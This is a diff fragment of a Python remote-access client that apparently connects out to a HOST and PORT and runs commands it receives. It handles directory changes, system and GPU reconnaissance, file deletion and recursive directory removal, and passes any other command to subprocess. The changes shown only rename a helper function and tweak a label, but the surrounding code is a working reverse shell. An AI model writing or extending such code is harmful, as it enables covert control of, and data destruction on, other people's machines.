@@ -17,7 +17,7 @@ sock.connect((HOST,PORT))
 
 is_running = True
 
-def _multi_words_dir(cmd: str) -> str:
+def _file_name(cmd: str) -> str:
     """If cmd eg. >> mkdir new folder it will return: new folder.
     Allows command line to be able to work with files/folders with multiple words
     separated with spaces."""
@@ -46,7 +46,7 @@ while is_running:
             if cmd.split(' ')[1] == '..':
                 os.chdir(os.path.split(os.getcwd())[0])
             else:
-                os.chdir(_multi_words_dir(cmd))
+                os.chdir(_file_name(cmd))
             sock.send('>> '.encode())
         elif cmd == 'sysinfo':
             GPU_list = []
@@ -76,7 +76,10 @@ while is_running:
             """
             
             if len(GPU_list) > 0:
-                sysinfo += 'GPUs:\n'
+                if len(GPU_list) == 1:
+                    sysinfo += 'GPU: \n'
+                else:
+                    sysinfo += 'GPUs:\n'
                 for gpu in GPU_list:
                     for key, value in gpu.items():
                         sysinfo += f'\t\t{key}: {value}\n'
@@ -85,15 +88,15 @@ while is_running:
             sock.send(sysinfo.encode())
         elif cmd.split(' ')[0] == 'rmdir':
             if len(cmd.split()) > 1:
-                shutil.rmtree(f'{os.getcwd()}\\{_multi_words_dir(cmd)}')
+                shutil.rmtree(f'{os.getcwd()}\\{_file_name(cmd)}')
             else:    
                 shutil.rmtree(os.getcwd())
             sock.send('>> '.encode())
         elif cmd.split(' ')[0] == 'delete':
-            os.remove(f'{os.getcwd()}\\{_multi_words_dir(cmd)}')
+            os.remove(f'{os.getcwd()}\\{_file_name(cmd)}')
             sock.send('>> '.encode())
         elif cmd.split(' ')[0] == 'mkdir':
-            os.mkdir(f'{os.getcwd()}\\{_multi_words_dir(cmd)}')
+            os.mkdir(f'{os.getcwd()}\\{_file_name(cmd)}')
             sock.send('>> '.encode())
         else:
             comm = subprocess.Popen(str(cmd),
